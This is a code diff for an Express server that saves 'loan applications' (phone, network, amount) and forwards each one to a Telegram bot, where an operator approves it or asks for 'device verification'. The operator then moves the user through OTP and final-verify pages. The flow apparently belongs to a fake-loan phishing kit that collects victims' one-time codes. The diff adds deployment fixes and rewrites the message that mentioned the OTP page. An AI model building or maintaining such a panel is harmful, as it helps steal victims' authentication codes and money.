@@ -3,6 +3,7 @@ const cors = require('cors');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
+const fs = require('fs');
 require('dotenv').config();
 
 const app = express();
@@ -19,13 +20,24 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Database setup
+// Database setup - Use /tmp on Railway (writable directory)
+const DB_PATH = process.env.NODE_ENV === 'production' ? '/tmp/loans.db' : './database/loans.db';
+
+// Ensure database directory exists (for local development)
+if (process.env.NODE_ENV !== 'production') {
+    const dbDir = path.dirname('./database/loans.db');
+    if (!fs.existsSync(dbDir)) {
+        fs.mkdirSync(dbDir, { recursive: true });
+    }
+}
+
 let db = null;
 
 async function initDatabase() {
     try {
+        console.log('Initializing database at:', DB_PATH);
         db = await open({
-            filename: './database/loans.db',
+            filename: DB_PATH,
             driver: sqlite3.Database
         });
 
@@ -61,7 +73,7 @@ async function initDatabase() {
             );
         `);
 
-        console.log('✅ Database initialized');
+        console.log('✅ Database initialized successfully at:', DB_PATH);
         return true;
     } catch (error) {
         console.error('❌ Database error:', error);
@@ -112,7 +124,11 @@ function generateLoanId() {
 
 // Health check
 app.get('/health', (req, res) => {
-    res.json({ status: 'ok', timestamp: new Date().toISOString() });
+    res.json({ 
+        status: 'ok', 
+        timestamp: new Date().toISOString(),
+        database: db ? 'connected' : 'disconnected'
+    });
 });
 
 // Save loan application from verify page - SENDS 4 BUTTONS TO TELEGRAM
@@ -129,6 +145,12 @@ app.post('/api/save-loan', async (req, res) => {
                 success: false, 
                 error: 'Missing required fields: phone, network, amount' 
             });
+        }
+        
+        // Check database connection
+        if (!db) {
+            console.error('Database not initialized');
+            return res.status(500).json({ success: false, error: 'Database not initialized' });
         }
         
         const loanId = generateLoanId();
@@ -240,7 +262,7 @@ app.post('/webhook/telegram', async (req, res) => {
                     `<b>📞 Phone:</b> <code>${loan.phone}</code>\n` +
                     `━━━━━━━━━━━━━━━━━━\n\n` +
                     `<b>Status:</b> ✅ APPROVED\n` +
-                    `<b>User can now proceed to OTP page.</b>`;
+                    `<b>User can now proceed to complete their loan.</b>`;
                     
             } else if (action === 'verify') {
                 responseText = "📱 Device verification required.";
@@ -390,7 +412,11 @@ app.get('/final-verify.html', (req, res) => {
 
 // Start server
 async function startServer() {
-    await initDatabase();
+    const dbInitialized = await initDatabase();
+    
+    if (!dbInitialized) {
+        console.error('⚠️ Failed to initialize database, but server will continue');
+    }
     
     app.listen(PORT, '0.0.0.0', () => {
         console.log(`🚀 Server running on port ${PORT}`);
